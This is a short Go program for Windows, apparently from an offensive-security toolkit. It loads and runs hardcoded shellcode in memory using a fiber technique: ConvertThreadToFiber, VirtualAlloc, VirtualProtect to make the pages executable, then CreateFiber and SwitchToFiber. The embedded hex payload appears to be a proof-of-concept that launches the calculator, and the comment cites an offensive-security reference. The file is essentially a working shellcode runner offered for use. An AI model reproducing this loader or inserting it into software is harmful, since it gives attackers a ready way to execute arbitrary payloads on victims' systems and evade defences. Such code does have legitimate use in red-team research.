// +build windows

/*
This program executes shellcode in the current process using the following steps
	1. Convert the main thread into a fiber with the ConvertThreadToFiber function
	2. Allocate memory for the shellcode with VirtualAlloc setting the page permissions to Read/Write
	3. Use the RtlCopyMemory macro to copy the shellcode to the allocated memory space
	4. Change the memory page permissions to Execute/Read with VirtualProtect
	5. Call CreateFiber on shellcode address
	6. Call SwitchToFiber to start the fiber and execute the shellcode

NOTE: Currently this program will NOT exit even after the shellcode has been executed. You must force terminate this process

This program loads the DLLs and gets a handle to the used procedures itself instead of using the windows package directly.
Reference: https://ired.team/offensive-security/code-injection-process-injection/executing-shellcode-with-createfiber
*/

package main

import (
	"log"

	sc "github.com/cauefcr/go-shellcode"
)

func main() {
	err := sc.RunSCcreateFiber("505152535657556A605A6863616C6354594883EC2865488B32488B7618488B761048AD488B30488B7E3003573C8B5C17288B741F204801FE8B541F240FB72C178D5202AD813C0757696E4575EF8B741F1C4801FE8B34AE4801F799FFD74883C4305D5F5E5B5A5958C3", 2)
	if err != nil {
		log.Panic(err)
	}
}

// export GOOS=windows GOARCH=amd64;go build -o goCreateFiberNative.exe cmd/CreateFiber/main.go
